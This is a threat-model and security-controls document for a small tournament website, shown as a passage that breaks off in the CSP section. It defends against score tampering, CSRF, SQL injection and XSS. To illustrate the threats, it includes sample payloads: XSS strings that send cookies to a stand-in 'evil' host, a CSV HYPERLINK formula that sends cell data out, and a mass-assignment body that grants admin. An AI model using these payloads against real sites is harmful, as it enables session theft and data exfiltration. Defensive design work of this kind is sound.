# nellore.club — threat model and security controls

**Status: normative.** Every control below is a build requirement, not a suggestion. Where a control
contradicts a convenience, the control wins.

Companion documents: [`API.md`](./API.md) (the contract each control attaches to) and
[`AUTH.md`](./AUTH.md) (how identity is established). Section anchors here are referenced from both.

---

## 1. What we are actually protecting

This is a small club's tournament platform, not a bank. Being honest about the assets keeps the
controls proportionate.

| Asset | Why an attacker wants it | If lost |
| --- | --- | --- |
| **Match results and standings** | Prize money (₹5,000–₹50,000 pools), local reputation, a spot in a final | The club's credibility. This is the crown jewel. A tournament platform whose results can be edited by the wrong person has no product. |
| **The leaderboard** | Cross-tournament ranking, bragging rights, seeding advantage | Same, slower. |
| **Entrant phone numbers** | Spam, WhatsApp scams, poaching by a rival club; regulated PII under India's DPDP Act 2023 | Legal exposure and a total loss of member trust. Nobody gives their number to a club that leaked it. |
| **Player accounts** | Impersonation, withdrawing a rival's entry, claiming someone's results | Individually small, collectively corrosive. |
| **The admin role** | Everything above at once | Total compromise. |
| **Availability during a live event** | A knocked-out site during the final is the most visible possible failure | Reputational, immediate, and public. |
| **Worker/D1 spend** | A cost-amplification attack turns a ₹400/month site into a bill | Financially real; Cloudflare Workers bills on requests and CPU. |

**Realistic adversaries**, in the order they will actually show up:

1. **A competitive player** who wants their own score changed, or a rival's changed. Motivated,
   present at the venue, technically curious, will open DevTools. **This is the primary adversary and
   most of this document is about them.**
2. **A bored teenager** with `curl` and a script, spamming registrations on a free tournament for fun.
3. **A disgruntled or careless organizer** with legitimate scope over one tournament, reaching for
   another.
4. **A commodity scanner** hitting every endpoint with SQLi and XSS payloads because that is what
   scanners do.
5. **A rival club** scraping the member list and phone numbers.

Not in the model: a nation-state, a targeted supply-chain implant, or a physical attack on Cloudflare.

---

## 2. Score tampering

**Threat.** A player, or anyone who is not an organizer of *this* tournament, changes a match result —
or an organizer of *another* tournament reaches across, or an organizer quietly edits a result after
the fact and nobody notices.

Because the frontend is a static export with all logic in the browser, the attacker has the complete
client source, sees every API call in DevTools, and can replay any of them with `curl`. **No control
that lives in the React app counts as a control.** Hiding the score form is UX, not security.

### 2.1 Authorization

`PUT /api/v1/organizer/matches/:id/score` requires `ORG_OF(match.tournament)` (AUTH.md §7.2) —
evaluated by loading the match, reading **its** `tournament_id`, loading that tournament, and checking
ownership or a `tournament_organizers` row. The request body's opinion about which tournament this is
never enters the predicate.

A player hitting the endpoint gets `404 not_found` (the object is not publicly writable and confirming
its existence buys them nothing). An organizer of a different tournament gets `403 forbidden`.

### 2.2 The server owns the arithmetic

Even a legitimate organizer cannot write an arbitrary result. `PUT .../score` validates, in order
(API.md §4.13):

1. Every `entrant_id` in `scores` is a slot **of this match**. A foreign entrant id is a `400`. This is
   the check that blocks "declare a team that isn't even playing as the winner".
2. `scores` covers exactly the match's filled slots, once each.
3. **The server recomputes the winner from the scores** and rejects a `winner_entrant_id` that
   contradicts them. The client never decides who won.
4. `best_of` consistency: the winner's score must be `ceil((N+1)/2)` and the total `≤ N`.
5. Draws (`is_draw: true`) only when the game definition allows them (`CONTENT.md` scoring block).
6. Battle-royale points are computed **entirely server-side** from
   `tournaments.scoring_config_json` (`placement_points[placement-1] + kills * kill_points + bonus`).
   The client submits placements and kills; it never submits a total. A tampered total is not a
   representable request.
7. Bracket advancement is computed server-side from the winner. There is no endpoint that says
   "put entrant X into match Y slot Z".

### 2.3 Every write is evidence

- `matches.result_version` increments on every write, so a silent overwrite is impossible: the second writer
  gets `409 stale_version` (API.md §6.2).
- **`match_audit` is append-only.** Every score, correction, clear and forced status inserts a row with
  `before_json`, `after_json`, actor and timestamp. The previous score is never destroyed. There is no
  endpoint that deletes from this table.
- **`matches.recorded_by`** and **`matches.updated_at`** are **public** on the bracket, where API.md
  §1.7 projects them as `updated_by: { handle, display_name }` and `updated_at`, and the UI shows
  "Updated by @sudheer, 2:02 PM". Attribution in front of every entrant is a stronger deterrent
  against a careless organizer than any access control. (There is **no** `matches.updated_by_user_id`
  column — `db/schema.sql` has `recorded_by`, `pending_confirm_by` and `confirmed_by`. The old name
  appeared here and in AUTH.md §7.3 and resolved to nothing, which meant the public attribution had
  no source and the dual-confirm predicate could not be implemented as written.)
- **The `audit_log` row is written inside the same `.batch()` as the mutation.** Not in
  `ctx.waitUntil()`, not after the response. `.batch()` is D1's only atomicity primitive; putting the
  audit row inside it means a successful score change without an audit trail is not a state the
  database can reach. An audit log that can be lost while the mutation succeeds is worse than none,
  because it is trusted.
- `POST /organizer/matches/:id/reopen` demands a `reason` of at least 10 characters and **that reason
  is published on the bracket**. Corrections are legitimate; silent corrections are not.
- Publishing (`results_published_at`) **freezes scores**. Every score endpoint returns
  `409 bracket_locked` afterwards. Unpublishing is `ADMIN ∧ UV ∧ STEPUP`, requires a public reason, and
  is audited.
- `tournaments.require_dual_confirm_final = 1` makes the final's score need a second, **different**
  organizer to `POST /organizer/matches/:id/confirm`. The predicate is
  `ORG_OF(t) ∧ match.pending_confirm_by IS NOT NULL ∧ u.id ≠ match.pending_confirm_by` (AUTH.md
  §7.3, API.md §4.13b). Both extra clauses are load bearing: without `IS NOT NULL` the comparison
  against a `NULL` column trivially passes and the control becomes decorative on exactly the match
  with the prize money attached. Recommended for anything with a prize pool worth arguing about.

### 2.4 The controls that were deliberately not built

- **No "sign in as user" for admins.** In a product whose entire output is competitive results, "the
  admin was signed in as the winner when that score was entered" must not be a sentence anyone can
  construct. An admin can revoke and inspect; they cannot become someone else.
- **No step-up re-auth on score entry.** An organizer entering forty badminton results in ninety
  minutes cannot be fingerprinted every fifteen minutes. They would work around it, and the workaround
  (leaving the laptop unlocked, sharing an account) is strictly worse than the risk. Score integrity
  rests on the predicate, the append-only history, public attribution, and the audit log — controls
  that do not decay under time pressure.
- **No automatic bracket rewrite on disqualification.** Disqualifying an entrant marks them; it does
  not silently rewrite downstream matches. Each affected match must be resolved by an explicit,
  audited walkover. Automatic cascades are how a bracket quietly becomes wrong.

---

## 3. Mass fake registrations

**Threat.** A free tournament with 64 slots is filled by a script in ten seconds; real players cannot
enter; the organizer spends the evening deleting rows.

**Controls, layered — no single one is expected to hold.**

| # | Control | Where |
| --- | --- | --- |
| 1 | **Account registration requires a passkey.** A bot farm needs a real authenticator with a real credential per account. This is not free to automate, and it is a meaningfully higher bar than an email address. | AUTH.md §3 |
| 2 | **One live entrant per user per tournament,** enforced by a partial unique index on `(tournament_id, user_id) WHERE user_id IS NOT NULL AND status NOT IN ('withdrawn','disqualified')`. The database, not the handler, is the guarantee. | API.md Appendix E |
| 3 | **Guest self-registration is opt-in per tournament** (`allow_guest_registration`, default `0`) and always lands in `status = 'pending'`. | AUTH.md §8.2 |
| 4 | **Join codes** (`requires_join_code`) — 6 chars from a 28-symbol alphabet, ~28.5 bits, HMAC-stored, single-use or capped-shared, expiring. Recommended default for any free tournament. Guessing means ~380 million attempts through a 5-per-minute limit. | API.md §4.18 |
| 5 | **Cloudflare Turnstile** on guest registration and signup when `TURNSTILE_SECRET_KEY` is set. Free, no vendor cost, one `fetch` to `siteverify`. Cleanly skipped and hidden in the UI when unset. | AUTH.md §8.2 |
| 6 | **Rate limits**: `rl_register` 5/60 s per user, `rl_register_ip` 15/24 h per IP hash, `rl_guest` 5/60 s per IP hash. | §12 |
| 7 | **`requires_confirmation`** (default on for free tournaments): entrants sit in `pending` until an organizer confirms. Junk never reaches the bracket. | API.md §4.8 |
| 8 | **`min_account_age_hours`** — a tournament may require accounts older than N hours, which defeats register-then-immediately-spam. | API.md §4.2 |
| 9 | **`max_entrants` + waitlist**, enforced as a **condition carried by the `INSERT` and the counter `UPDATE` themselves** (`INSERT … SELECT … WHERE (SELECT entrant_count …) < max_entrants`), not as a `SELECT` "inside the batch" — a D1 batch has no procedural logic and a zero-row statement is a *successful* one, so a check-then-insert would let both concurrent registrations at slot 64 commit. `meta.changes === 0` on either statement is `409 tournament_full`. | API.md §3.3, §6.2.1 |
| 10 | **Idempotency keys** so a genuine retry on bad 4G does not create a second entrant, and so the retry is not misreported to the player as an error. | API.md §6.1 |

**Blast radius if it all fails:** a list of `pending`, unconfirmed, unseeded rows with no `user_id`,
excluded from the public entrant list, excluded from the bracket, and worth nothing on the
leaderboard. The organizer bulk-rejects them. That is a deliberate design property: the abuse lands in
a quarantine, not in the tournament.

---

## 4. IDOR and broken object-level authorization

**Threat.** `PATCH /api/v1/entrants/ent_01JB.../` with somebody else's id. Reading a draft tournament
by guessing its slug. Enumerating entrants to harvest phone numbers.

**Rule 1 — unguessable identifiers.** Every id is a prefixed ULID with **80 bits of CSPRNG**
randomness (API.md §0.7). Enumeration is not feasible. This is defence in depth, not the defence:
an id is not a secret and must never be treated as one.

**Rule 2 — the predicate is evaluated against the loaded object, always.**

```
load the object by its path id
  → derive its parent (entrant → tournament, match → tournament, announcement → tournament)
  → evaluate the predicate against the DERIVED parent
  → only then read the request body
```

No handler may take a `tournament_id`, a `user_id`, or an `entrant_id` from the request body and use
it in an authorization decision. Body fields are data; path ids plus the database are authority.
Concretely: `PATCH /organizer/entrants/:id` loads the entrant, reads `entrant.tournament_id`, loads
that tournament, and checks `ORG_OF` on it — it does not accept a tournament id from the caller.

**Rule 3 — mass assignment is closed.** Every handler builds its `UPDATE` from an **explicit allowlist
of field names** for that endpoint and that caller's role. No `Object.assign(row, body)`, no spreading
the parsed body into a query builder, ever. Without this, `PATCH /me` with
`{"role":"admin","session_epoch":0}` becomes privilege escalation. Unknown fields in a body are
**rejected** with `400 validation_failed` rather than ignored — silently dropping a field is how an
organizer discovers at 8 p.m. that the setting they changed never saved.

**Rule 4 — the not-found/forbidden distinction is deliberate.**
- Object is publicly visible, predicate fails → `403 forbidden`.
- Object is not publicly visible, predicate fails → **`404 not_found`**, byte-identical to a genuinely
  nonexistent object.

So probing `/api/v1/tournaments/summer-secret-cup/` cannot tell you whether the club has an
unannounced tournament by that name. A `draft` tournament and a typo produce the same response.

**Rule 5 — public list endpoints are filtered at the SQL level.**
`GET /tournaments` has `AND status NOT IN ('draft','archived')` **in the query**, not applied in
JavaScript after fetching. A filter applied after the read is one refactor away from being skipped.

**Rule 6 — capability tokens are scoped to one row.** `X-Guest-Token` authorises exactly one entrant
(AUTH.md §8.3). There is no guest endpoint that takes an entrant id — the token *is* the identifier,
so a guest cannot substitute another entrant's id even in principle.

**Rule 7 — the public/private response split is structural, not conditional.** There are two entrant
serialisers: `toPublicEntrant()` and `toPrivateEntrant()`. Public endpoints call the first, and it
does not have access to `organizer_note`, `phone`, `payment_ref` or non-public custom fields. There is
no `if (isOrganizer) { row.phone = ... }` branch anywhere, because that branch is one inverted
condition away from a leak — and because a response whose shape depends on the caller cannot be edge
cached (API.md §1).

---

## 5. CSRF, session fixation, and cookie integrity

### 5.1 Why SameSite is not the answer

`SameSite=Lax` is set (AUTH.md §5.1) and it does real work: it withholds the session cookie from
cross-site `POST`s. It is **not sufficient**, for four concrete reasons:

1. **It cannot be `Strict`.** The product's distribution is WhatsApp links. Under `Strict`, a user
   tapping `/t/bgmi-diwali-2026/` from a group chat arrives signed out. `Lax` is a product
   requirement, and `Lax` permits cross-site top-level `GET`s.
2. **`Lax` has a same-site blind spot.** Any page on `nellore.club` — including one served from a
   subdomain that shares the site under some browsers' definitions, or a stored-XSS payload — is
   same-site and gets the cookie.
3. **Browser support is a floor, not a guarantee.** Old Android WebViews and embedded in-app browsers
   (and this audience opens links inside the WhatsApp browser constantly) have historically had
   inconsistent `SameSite` handling.
4. **`Lax` protects the cookie, not the endpoint.** It says nothing about a request that carries the
   guest token, and nothing about a future third-party integration.

### 5.2 The layered CSRF control

Three independent checks on **every** mutating request. All three must pass.

1. **Origin allowlist.** `Origin` (falling back to the origin parsed out of `Referer`) must be exactly
   `https://nellore.club` or `https://www.nellore.club` — plus `http://localhost:8787` only when
   `ENVIRONMENT !== "production"`. **A missing `Origin` on a mutating request is a rejection**
   (`403 origin_not_allowed`), not a pass. Browsers send `Origin` on every `POST`/`PUT`/`PATCH`/`DELETE`,
   including same-origin ones; only a non-browser client omits it, and no non-browser client is
   supported.
2. **Session-bound CSRF token.** `X-CSRF-Token` must equal `sessions.csrf_token`, compared in constant
   time. The token is delivered only by `GET /api/v1/auth/session` — a same-origin `GET` whose
   response a cross-origin page cannot read. The SPA holds it **in memory**, never in `localStorage`
   (where XSS could read it and where it would outlive the session) and never in a cookie (where a
   sibling subdomain could set it — the classic double-submit weakness). Rotated on every session
   rotation.
3. **`Content-Type: application/json` required**, and no CORS headers are ever emitted for `/api/*`. A
   cross-site HTML form can only send `application/x-www-form-urlencoded`, `multipart/form-data`, or
   `text/plain`, so it cannot produce a request this API will parse. A cross-site `fetch` that sets
   the JSON content type triggers a preflight, and the preflight fails because there is no
   `Access-Control-Allow-Origin`.

**CORS posture:** the API emits **no** `Access-Control-*` headers at all, and `OPTIONS` on `/api/*`
returns `403`. The frontend is same-origin. If a third-party integration is ever needed, it gets an
explicit allowlist and a token — never a wildcard.

### 5.3 Endpoints exempt from the CSRF token, and why that is safe

The pre-session endpoints — `/auth/passkey/*`, `/auth/recovery/login`, `/auth/email/*`,
`POST /tournaments/:slug/guest-register` — have no session, so there is no token to send. They are
protected by checks 1 and 3 above, plus:

- **WebAuthn is intrinsically CSRF-resistant.** The ceremony is bound to a server-issued single-use
  challenge and the authenticator signs `clientDataJSON` containing the real `origin`, which the
  server verifies against the allowlist. A forged cross-site ceremony cannot produce a valid
  signature over the right origin.
- The attacker cannot read any response (no CORS), so even a forced ceremony yields nothing.
- Session rotation on authentication (§5.4) means a forced sign-in cannot plant a known session.

The `X-Guest-Token` routes are exempt for the same structural reason: a custom request header cannot
be attached by a cross-site form, and a cross-site `fetch` that adds one is preflighted and blocked.

### 5.4 Session fixation

- **The client never proposes a session identifier.** The only way `sessions` gains a row is a
  successful ceremony inside the Worker.
- **The session is rotated — new id *and* new secret — on every authentication** (AUTH.md §5.6). If a
  request arrives at a verify endpoint carrying an existing session cookie, that session is revoked in
  the same batch. An identifier that existed before authentication never carries authority after it.
- Rotation also happens on the recovery→full scope upgrade, on a UV upgrade, and on revoke-all-others.
- **The `__Host-` cookie prefix** makes it impossible for any subdomain to set or shadow
  `__Host-nc_session`: the browser rejects the cookie unless it has `Secure`, `Path=/`, and **no**
  `Domain` attribute. Cookie shadowing from a sibling host — a future `blog.nellore.club` on somebody
  else's platform — is a dull, common way session security dies, and the prefix closes it for the cost
  of eight characters.
- Session tokens never appear in a URL, a query string, a `Referer`, or a log line.
- **Guest tokens do briefly appear in a URL** (`?g=<token>`) because that is the only way to hand a
  capability to someone with no account. Mitigations: the SPA calls `history.replaceState` on first
  paint to strip it; `Referrer-Policy: strict-origin-when-cross-origin` prevents it leaking outbound;
  the token is scoped to one entrant; it expires when the tournament completes; the organizer can
  rotate it. The residual risk — a screenshot of the address bar shared in a group — is accepted and
  documented in §16.

---

## 6. SQL injection

**The rule, and it is absolute:**

> Every SQL statement in this codebase is created with `db.prepare(<string literal>)` and its
> parameters are supplied with `.bind(...)`. No SQL string is ever produced by concatenation,
> template interpolation, or `+`, anywhere — not in handlers, not in migrations, not in admin tooling,
> not in a "quick" seed script.

```ts
// Correct.
const row = await env.DB
  .prepare('SELECT * FROM tournaments WHERE slug = ?1 AND status NOT IN (?2, ?3) LIMIT 1')
  .bind(slug, 'draft', 'archived')
  .first();

// Forbidden. There is no version of this that is acceptable.
const row = await env.DB.prepare(`SELECT * FROM tournaments WHERE slug = '${slug}'`).first();
```

**The four places this rule gets quietly broken, and the ruling for each:**

1. **Dynamic `IN (...)` lists** (filtering by several game slugs). Generate the *placeholders*, never
   the values, and cap the count:
   ```ts
   const slugs = input.slice(0, 10);
   const ph = slugs.map((_, i) => `?${i + 1}`).join(',');
   db.prepare(`SELECT ... WHERE g.slug IN (${ph}) LIMIT 100`).bind(...slugs);
   ```
   The interpolated text is `?1,?2,?3` — derived from `slugs.length`, never from `slugs` contents.
2. **Dynamic `ORDER BY`.** SQLite cannot bind an identifier. Map the client's `sort` parameter through
   a **hardcoded lookup object** to a literal fragment; an unknown key falls back to the default.
   Never interpolate the client's string, even after "validating" it.
   ```ts
   const ORDER = { starts_at_asc: 'starts_at ASC, id ASC', newest: 'id DESC' } as const;
   const orderBy = ORDER[sort as keyof typeof ORDER] ?? ORDER.starts_at_asc;
   ```
3. **`LIKE` search.** The user's `q` is bound, but `%`, `_` and `\` inside it are metacharacters.
   Escape them and declare the escape character:
   ```ts
   const needle = '%' + q.replace(/[\\%_]/g, c => '\\' + c) + '%';
   db.prepare("SELECT ... WHERE title LIKE ?1 ESCAPE '\\' LIMIT 20").bind(needle);
   ```
   Without `ESCAPE`, a `q` of `%` returns everything — a cheap way to make D1 scan the table.
4. **JSON columns.** `fields_json`, `scoring_config_json` and friends are stored as `TEXT` and are
   **never** filtered with `json_extract` on a request path. Anything that needs filtering gets a real
   column. This avoids both the performance cliff and any question of injection through a JSON path
   expression.

D1 has **no stored procedures, no dynamic SQL execution, and no multi-statement `exec` on a request
path**. `db.exec()` is for migrations only and never receives user input. `.batch()` takes an array of
already-prepared, already-bound statements.

**Independent backstop:** every user-supplied string is length-capped and charset-validated at the
edge of the handler (§7.2, §11) before it reaches any query. Injection is not the reason for that
validation, but it is a second wall.

---

## 7. XSS and content injection

**Threat.** A team named `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` appears on the
bracket that every entrant loads. A tournament's markdown rules carry a `javascript:` link. A handle
uses right-to-left override characters to impersonate another player.

The session cookie is `HttpOnly`, so XSS cannot read it directly — but XSS runs *as the user*, and can
therefore call `GET /api/v1/auth/session` to fetch the CSRF token and then withdraw entries, change
scores (if the victim is an organizer), or exfiltrate the entrant list. `HttpOnly` limits the damage;
it does not contain it.

### 7.1 Rich text: no HTML reaches the client, ever

The full contract is API.md §9. The security-relevant summary:

- Organizer markdown (`rules_md`, `body_md`) is parsed **in the Worker at write time** into a
  restricted **JSON AST** with a closed node allowlist. The AST is what the API serves.
- The React client renders that AST with a `switch` over node types into real React elements. React
  escapes text nodes by construction.
- **`dangerouslySetInnerHTML` does not appear anywhere in the codebase.** Enforce it with an ESLint
  rule (`react/no-danger: "error"`) and a `grep` in CI. This is the single most valuable line of
  defence in this section, because it makes stored XSS structurally impossible rather than
  conditionally prevented.
- Raw HTML in the markdown source is **dropped**, not escaped-and-rendered. Images, tables, footnotes
  and autolinks are dropped. An organizer has no legitimate need to embed HTML in tournament rules.
- Link `href` must be `https:`, `http:` (upgraded), or a same-site path starting `/`. `javascript:`,
  `data:`, `vbscript:`, `mailto:`, `tel:` and scheme-relative `//host` are dropped and the link
  degrades to plain text. Rendered links carry `rel="nofollow ugc noopener noreferrer"`.
- Caps: depth ≤ 6, nodes ≤ 2000, serialised AST ≤ 64 KiB — an unbounded AST is a client-side denial of
  service on a mid-range Android phone.

**Rejected: sanitising HTML server-side.** One sanitiser bypass — mXSS, namespace confusion, a novel
parser quirk — is stored XSS on every viewer of that tournament, and sanitisers are a permanent
arms race.
**Rejected: DOMPurify on the client.** ~20 KB gzipped on a bundle budget that genuinely matters on 4G,
and it relocates the trust boundary onto the device.

### 7.2 Short strings: strict charsets, no markup at all

| Field | Rule |
| --- | --- |
| `handle` | `^[a-z0-9][a-z0-9_]{2,19}$` (3–20 chars, **no hyphen** — hyphens belong to slugs, and keeping the two alphabets disjoint removes a whole class of "is this a handle or a slug" confusion). Lowercased, NFC. Reserved list rejected (API.md Appendix B). |
| `slug` | `^[a-z0-9][a-z0-9-]{1,40}$` (2–41 chars), must not end in a hyphen, no consecutive hyphens, reserved list rejected. |
| `display_name`, `team_name` | 2–60 / 2–40 chars **after NFC normalisation**. Allowed: Unicode letters and marks (`\p{L}\p{M}`), digits, space, and `. ' -` — Telugu and Hindi names must work, so an ASCII-only rule is not acceptable. Rejected: `<`, `>`, `&`, `"`, `'`(backtick), `\`, and every C0/C1 control character. |
| `team_tag` | `^[A-Za-z0-9]{1,6}$`. |
| `bio`, `notes`, `organizer_note`, `payment_ref` | Plain text, capped, newlines collapsed for `bio`. No markdown, no AST — rendered as text. |
| `checkin_code`, `join_code` | Fixed alphabet, fixed length. |

**Additionally rejected in every display string** (this is the impersonation defence, and it matters
in a competitive setting):
- **Bidi controls** `U+202A–U+202E`, `U+2066–U+2069` — used to render `nimda` as `admin`.
- **Zero-width** `U+200B`, `U+200C`, `U+200D`, `U+FEFF` — used to make `ra​vik` look identical to
  `ravik`.
- **Whitespace impostors** `U+00A0`, `U+2000–U+200A`, `U+3000`.
- Leading/trailing whitespace (trimmed), and runs of internal whitespace (collapsed to one space).
- A `display_name` that, after normalisation and stripping, collapses to fewer than 2 visible
  characters.

`handle` uniqueness is checked on the **normalised** form, and — because the alphabet is
`[a-z0-9_-]` — there is no confusable-script problem there by construction. That is the reason handles
are restricted to ASCII while display names are not: the identifier must be unambiguous, the label
must be humane.

**Handle squatting after a rename:** a released handle is held in `handle_reservations` for **90 days**
and 404s during that window. Without it, renaming and immediately grabbing the vacated handle is an
impersonation attack against every WhatsApp link already pointing at the old profile.

### 7.3 HTML injection through the OG meta rewriter

The Worker injects tournament titles into `<meta content="...">` with `HTMLRewriter` (API.md §8.6).
A tournament titled `"><script>fetch('//evil')</script>` would otherwise be **stored XSS on every
share and every page view**, and it would bypass §7.1 entirely because it happens outside React.

Control: every injected value is HTML-attribute-escaped — `&`→`&amp;`, `<`→`&lt;`, `>`→`&gt;`,
`"`→`&quot;`, `'`→`&#39;` — **before** being passed to `setAttribute`. Additionally, titles are
truncated to 120 characters and descriptions to 155 before escaping, and the JSON-LD block is produced
with `JSON.stringify` and then has `<` replaced by `<` (the standard defence against
`</script>` breaking out of a JSON-LD block). The `§7.2` charset rules already forbid `<` and `>` in a
title; this is the second wall, and both are required.

### 7.4 CSV injection (the entrants export)

A team name of `=HYPERLINK("http://evil/?d="&A1,"click")` in a CSV becomes a live formula when the
organizer opens the export in Excel or Google Sheets — a real, routinely-exploited path from a
low-privilege input to code execution on a club officer's laptop.

Control, applied to **every** cell of `entrants.csv`: if the first character is `=`, `+`, `-`, `@`,
TAB (`0x09`), or CR (`0x0D`), prefix the cell with a single quote `'` before quoting. Then apply
normal RFC 4180 quoting (wrap in `"`, double any internal `"`). The file also starts with a UTF-8 BOM
so Excel does not mangle Telugu names.

### 7.5 Open redirect

There is exactly one redirect that takes a target from user input: the post-sign-in `?next=` return
path. It is validated as: starts with a single `/`, does **not** start with `//` or `/\`, contains no
`\`, and after `new URL(next, 'https://nellore.club')` the resulting origin is still
`https://nellore.club`. Anything else falls back to `/`. Every other redirect in the Worker
(`http:`→`https:`, `www`→apex, slug redirects) has a server-computed target.

---

## 8. Security headers

Sent by the Worker on **every** response (API.md Appendix A, step 12). HTML gets the full set; JSON
gets a reduced set (`default-src 'none'` is correct and cheap for an API response).

```
Content-Security-Policy: <see §8.1>
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
X-Frame-Options: DENY
Permissions-Policy: accelerometer=(), ambient-light-sensor=(), autoplay=(), camera=(),
                    display-capture=(), encrypted-media=(), fullscreen=(self), geolocation=(),
                    gyroscope=(), magnetometer=(), microphone=(), midi=(), payment=(),
                    publickey-credentials-get=(self), screen-wake-lock=(), usb=(),
                    xr-spatial-tracking=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Cross-Origin-Embedder-Policy: credentialless
X-Robots-Tag: noindex        (on /api/*, /admin/*, /organizer/* only)
```

Two entries that are easy to get wrong and would break the product:

- **`publickey-credentials-get=(self)`** must be present in `Permissions-Policy`. Omitting it is
  usually harmless; explicitly denying it (`publickey-credentials-get=()`) **breaks passkey sign-in**
  in Chromium. Also do not send `publickey-credentials-create=()`.
- **`frame-ancestors 'none'`** in the CSP is the modern clickjacking control; `X-Frame-Options: DENY`
  is kept for old WebViews that ignore CSP — and this audience has old WebViews.

`Strict-Transport-Security` is also sent **on the `http:`→`https:` 301 itself**. Without that, a
visitor typing `nellore.club` is answered over plain HTTP, and every browser ignores an HSTS header
delivered over HTTP by spec — so they would never get pinned.

### 8.1 A real CSP for a Next.js static export

The hard part: a static export cannot mint a per-request nonce, and Next's App Router inlines
`self.__next_f.push(...)` flight-payload scripts into every prerendered page. `'unsafe-inline'` is the
lazy answer and it is not good enough here, because unlike a brochure site **this site renders
user-supplied content**.

**The answer: build-time hashes, per page.**

1. A post-build script `scripts/csp-hashes.mjs` walks `out/**/*.html`, extracts the exact byte content
   of every inline `<script>` (no trimming — CSP hashes the bytes between the tags verbatim), computes
   `sha256`, and writes `worker/csp-hashes.json`:
   ```jsonc
   {
     "/index.html":        ["sha256-2Xb…", "sha256-9Kd…"],
     "/t/_/index.html":    ["sha256-Pq1…", "sha256-Lm4…"],
     "/admin/index.html":  ["sha256-Zz7…"]
   }
   ```
   `package.json`: `"build": "next build && node scripts/csp-hashes.mjs"`. The two are never run
   separately.
2. The script **fails the build** if it finds an inline `<script>` it cannot hash, or an inline event
   handler attribute (`onclick=` etc.) in the output. A build that would need `'unsafe-inline'` does
   not ship.
3. The Worker imports the JSON (it is a few KB) and, for an HTML response, emits that page's hashes.
   Because the shells are served from a fixed asset path (`/t/_/index.html`) regardless of the URL,
   the lookup key is the **asset** path, not the request path.
4. `HTMLRewriter` touches `<head>` `<meta>`, `<title>` and `<link>` elements, **plus exactly one
   `<script>`: the `application/ld+json` block** (API.md §8.6). CSP `script-src` governs
   `<script type="application/ld+json">` just as it governs an executable one, so rewriting its
   contents invalidates the build-time hash — under `enforce` the block would be refused on every
   tournament page, the structured data would never ship, and every `/t/<slug>/` view would fire a
   CSP violation into the sampled report endpoint, poisoning the exact signal the report-only
   rollout depends on.

   So the Worker **computes `sha256` of the exact JSON-LD text it is about to inject** (with
   `crypto.subtle.digest`, over the same bytes it passes to `replace()`) and appends that source to
   the `script-src` it emits for **that response**. One hash per request, deterministic for a given
   tournament state, and the header is cached with the body under the existing `s-maxage=60` keyed
   by path — so it is computed roughly once per minute per tournament, not once per viewer. If the
   D1 read fails or the slug is unknown, no JSON-LD is injected and the shell's build-time-hashed
   placeholder is left untouched.

   No other `<script>` in the document is modified, so every build-time hash stays valid.

**Enforced policy (`CSP_MODE=enforce`, the default):**

```
default-src 'self';
script-src 'self' 'sha256-…' 'sha256-…';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self';
connect-src 'self';
form-action 'self';
base-uri 'self';
object-src 'none';
frame-src 'none';
frame-ancestors 'none';
manifest-src 'self';
worker-src 'self';
upgrade-insecure-requests;
report-uri /api/v1/csp-report
```

Notes on each judgement call:

- **`script-src` has no `'unsafe-inline'` and no `'unsafe-eval'`.** When hash sources are present,
  browsers ignore `'unsafe-inline'` anyway, so including it would be pure noise. `'self'` covers the
  hashed-filename chunks under `/_next/static/`.
- **`'strict-dynamic'` is deliberately omitted.** It would *replace* `'self'`, meaning every
  dynamically loaded chunk must be injected by an already-trusted script — Next does load chunks that
  way, but `'self'` already permits them and it fails safer for a static export. Adding
  `'strict-dynamic'` here buys nothing and adds a way to break lazy routes.
- **`style-src 'unsafe-inline'` is kept, knowingly.** React sets inline `style` attributes and Next
  inlines critical CSS. CSS injection is a genuine but far weaker vector (data exfiltration via
  attribute selectors, UI redress) and it requires attacker-controlled CSS, which §7.1's AST renderer
  makes unreachable — no user input becomes a style. Hashing styles was considered and rejected: the
  hash set churns on every Tailwind change and would break the site on a forgotten regeneration, for a
  marginal gain.
- **`connect-src 'self'`** — the API is same-origin. There is no analytics, no third-party font, no
  CDN script, and no embed anywhere on this site *in the default configuration*. Keep it that way;
  the whole policy depends on it. The **one** conditional exception is Turnstile, §8.1.1.
- **`img-src` includes `blob:`** for the client-side canvas used to render a shareable result card,
  and `data:` for inline SVG icons.
- **`frame-src 'none'`** — no YouTube embeds. Stream links open in a new tab. Embedding a third-party
  iframe would force `frame-src https://www.youtube.com` and a much weaker policy; a link is enough.
- `report-uri` (not `report-to`) because it remains the most widely supported. `POST /api/v1/csp-report`
  samples at **1%**, logs, returns `204`, and **never touches D1** — an unsampled, DB-backed report
  endpoint is a free write-amplification attack.

**Rollout.** Ship first with `CSP_MODE=report-only`, which sends the identical policy as
`Content-Security-Policy-Report-Only`. Watch the reports for a week of real traffic (including
in-app WhatsApp/Instagram browsers, which do surprising things). Then flip to `enforce`. `CSP_MODE`
stays as an env var so a bad hash regeneration can be de-fanged in one `wrangler deploy` instead of a
rollback.

**API (JSON) responses** get the cheap version:
`Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'`, plus
`X-Content-Type-Options: nosniff`. A JSON body mis-sniffed as HTML is an old but still-live trick.

### 8.1.1 Turnstile and the CSP — the conditional policy

Turnstile is a named control in three places (§3 control 5, §12.1, AUTH.md §8.2) and
`GET /api/v1/config` returns `turnstile_site_key` so the SPA can render the widget. But the widget
loads `https://challenges.cloudflare.com/turnstile/v0/api.js`, creates an **iframe** on that origin,
and makes XHRs back to it — all three of which the policy above forbids (`script-src 'self'`,
`frame-src 'none'`, `connect-src 'self'`), and `Cross-Origin-Embedder-Policy: credentialless` blocks
a cross-origin iframe that does not opt in.

The consequence, unfixed, is that **with `TURNSTILE_SECRET_KEY` set, guest registration is 100% dead
while the operator believes anti-abuse is on**: the widget never renders, the client cannot produce a
`turnstile_token`, and `POST /tournaments/:slug/guest-register` returns `403 turnstile_failed` for
every legitimate walk-in. The likely field fix — adding `'unsafe-inline'` or a wildcard to make the
widget work — discards the hash-based policy this section spends a page justifying.

**The resolution: the CSP is computed from the configuration, in one function, and Turnstile is the
only thing that can widen it.**

`worker/lib/csp.ts` emits the base policy above when `TURNSTILE_SITE_KEY` is **unset** — which is
